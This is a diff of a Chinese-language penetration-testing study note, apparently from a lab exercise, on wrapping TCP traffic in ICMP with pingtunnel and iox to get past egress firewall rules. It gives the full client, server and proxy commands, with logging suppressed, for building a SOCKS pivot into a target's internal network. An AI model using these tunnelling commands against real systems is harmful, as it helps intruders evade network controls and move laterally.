@@ -32,6 +32,7 @@
 
 ![1732523729550](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942048.png)
 
+#### http--封装--->icmp
   上线  使用工具 pingtunnel
 
  ./pingtunnel -type server
@@ -86,7 +87,7 @@ pingtunnel -type client -l :6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp
 
 这里还得需要一个dns的域名。省略这个
 
-  ### msb
+  ### smb
 
   MSF icmp实现上线。msf的dns过时，已下架。
 
@@ -98,7 +99,8 @@ pingtunnel -type client -l :6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp
 
 ### 内网穿透:
 
-   这里的状况（防火墙策略）是 web机器是只让web进，icmp出。隧道技术就是有一些放的口子（有一些出站的规则），这种一般都是内网穿透。演示一款工具：iox       pingtunnel                                                                                                   2222->4455->5566                   pingtunnel -type client -l 127.0.0.1:2222 -s 192.168.139.128 -t 192.168.139.128:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000           （这里的key是防止别人也连接到你打pingtunnel，所以有一个key）    192.168.139.141为kali   127.0.0.1web机器，因为web机的防火墙策略。所以这里命令就是将web机的2222端口的tcp协议的流量封装成icmp协议给发送到192.168.139.141:4455（kali的4455端口），在kali(攻击机)./pingtunnel -type server -noprint 1 -nolog 1 -key 000000接收目标发过来的icmp流量数据，然后因为是发到自己的4455端口，所以./iox proxy -l 4455 -l 5566  用iox代理工具将4455转至5566端口。在web机上还要建立SockS节点绑定2222端口----相当于创建一个2222端口，他才能将icmp流量数据转发出去：iox.exe proxy -r 127.0.0.1:2222。类似上面的socks端口创建，因为这里目标机的防火墙策略特殊，所以采用这种方法创建socks节点。后面就一样用代理Profiex连接socks，从而实现与目标机通讯。
+   这里的状况（防火墙策略）是 web机器是只让web进，icmp出。隧道技术就是有一些放的口子（有一些出站的规则），这种一般都是内网穿透。演示一款工具：iox       pingtunnel                                                                                                   2222->4455->5566                   pingtunnel -type client -l 127.0.0.1:2222 -s 192.168.139.128 -t 192.168.139.128:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000           （这里的key是防止别人也连接到你打pingtunnel，所以有一个key）    192.168.139.141为kali   127.0.0.1web机器，因为web机的防火墙策略。
+   所以这里命令就是将web机的2222端口的tcp协议的流量封装成icmp协议给发送到192.168.139.141:4455（kali的4455端口），在kali(攻击机)./pingtunnel -type server -noprint 1 -nolog 1 -key 000000接收目标发过来的icmp流量数据，然后因为是发到自己的4455端口，所以./iox proxy -l 4455 -l 5566  用iox代理工具将4455转至5566端口。在web机上还要建立SockS节点绑定2222端口----相当于创建一个2222端口，他才能将icmp流量数据转发出去：iox.exe proxy -r 127.0.0.1:2222。类似上面的socks端口创建，因为这里目标机的防火墙策略特殊，所以采用这种方法创建socks节点。后面就一样用代理Profiex连接socks，从而实现与目标机通讯。
 
 将web本地2222端口的TCP封装IMCP给能通讯的kali：-----已经将iox和pingtunne上传目标机了
 
@@ -117,3 +119,7 @@ pingtunnel -type client -l :6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp
 ![1732535373473](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942063.png)
 
 最后效果就是在本机能访问到目标主机，之间建立通讯。
+
+### 总结：
+使用一些封包工具，根据目标的配置，比如放行icmp，禁止其他的，那就将对应tcp之类的包的封包为icmp，让其能将流量出来，我们在监听获取到流量进而实现横向获取到权限。
+都是根据目标而改变的。
